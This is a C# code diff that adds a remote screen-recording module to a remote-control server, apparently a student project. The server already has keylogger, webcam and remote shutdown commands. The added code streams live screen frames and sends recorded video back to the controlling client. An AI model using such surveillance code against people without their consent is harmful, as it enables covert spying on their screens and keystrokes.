@@ -23,6 +23,7 @@ namespace ServerApp
         Thread udpDiscoveryThread; // Luồng riêng cho UDP Discovery
         Thread tklog = null; // Luồng riêng cho Keylogger để không chặn UI
         WebcamRecorder.WebcamCapture webcamCapture = null; // Instance cho Webcam
+        ScreenRecorder.ScreenCapture screenCapture = null; // Instance cho Screen Recorder
         public server()
         {
             InitializeComponent();
@@ -113,6 +114,7 @@ namespace ServerApp
                     case "APPLICATION": application(); break;
                     case "TAKEPIC": takepic(); break;
                     case "WEBCAM": webcam(); break;
+                    case "SCREEN_REC": screen_rec(); break;
                     case "SHUTDOWN": Process.Start("ShutDown", "-s"); break;
                     case "RESTART": Process.Start("shutdown", "/r /t 0"); break;
                     case "QUIT": return;
@@ -660,6 +662,122 @@ namespace ServerApp
                         {
                             string result = webcamCapture.ClearAllRecordings();
                             Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "QUIT": // Thoát module
+                        return;
+                }
+            }
+        }
+
+        // --- MODULE SCREEN RECORDING (MỚI) ---
+        public void screen_rec()
+        {
+            String cmd = "";
+
+            // Khởi tạo instance nếu chưa có
+            if (screenCapture == null)
+            {
+                screenCapture = new ScreenRecorder.ScreenCapture();
+            }
+
+            while (true)
+            {
+                receiveSignal(ref cmd);
+
+                switch (cmd)
+                {
+                    case "SCREEN_REC":
+                        // Bỏ qua nếu client gửi header lặp lại
+                        break;
+
+                    case "START": // Bắt đầu Stream (tương đương ON bên Webcam)
+                        {
+                            string result = screenCapture.StartStream();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "STOP": // Dừng Stream (tương đương OFF bên Webcam)
+                        {
+                            string result = screenCapture.StopStream();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "GET_FRAME": // Lấy 1 frame màn hình (Live view)
+                        {
+                            byte[] frameBytes = screenCapture.GetCurrentFrameAsJpeg();
+
+                            if (frameBytes != null && frameBytes.Length > 0)
+                            {
+                                Program.nw.WriteLine(frameBytes.Length.ToString());
+                                Program.nw.Flush();
+                                Program.client.Send(frameBytes);
+                            }
+                            else
+                            {
+                                Program.nw.WriteLine("0");
+                                Program.nw.Flush();
+                            }
+                            break;
+                        }
+
+                    case "START_REC": // Bắt đầu ghi file
+                        {
+                            string result = screenCapture.StartRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+                            break;
+                        }
+
+                    case "STOP_REC": // Dừng ghi và gửi file về
+                        {
+                            string result = screenCapture.StopRecording();
+                            Program.nw.WriteLine(result);
+                            Program.nw.Flush();
+
+                            if (result.StartsWith("RECORDING_STOPPED"))
+                            {
+                                string[] parts = result.Split('|');
+                                if (parts.Length >= 2 && !string.IsNullOrEmpty(parts[1]))
+                                {
+                                    string filename = parts[1];
+                                    byte[] videoBytes = screenCapture.GetVideoBytes(filename);
+
+                                    if (videoBytes != null && videoBytes.Length > 0)
+                                    {
+                                        Program.nw.WriteLine(videoBytes.Length.ToString());
+                                        Program.nw.Flush();
+
+                                        int chunkSize = 1024 * 1024;
+                                        int offset = 0;
+                                        while (offset < videoBytes.Length)
+                                        {
+                                            int remaining = videoBytes.Length - offset;
+                                            int currentChunkSize = Math.Min(chunkSize, remaining);
+                                            Program.client.Send(videoBytes, offset, currentChunkSize, System.Net.Sockets.SocketFlags.None);
+                                            offset += currentChunkSize;
+                                        }
+                                    }
+                                    else
+                                    {
+                                        Program.nw.WriteLine("0");
+                                        Program.nw.Flush();
+                                    }
+                                }
+                            }
+                            break;
+                        }
+
+                    case "STATUS":
+                        {
+                            string status = screenCapture.GetStatus();
+                            Program.nw.WriteLine(status);
                             Program.nw.Flush();
                             break;
                         }
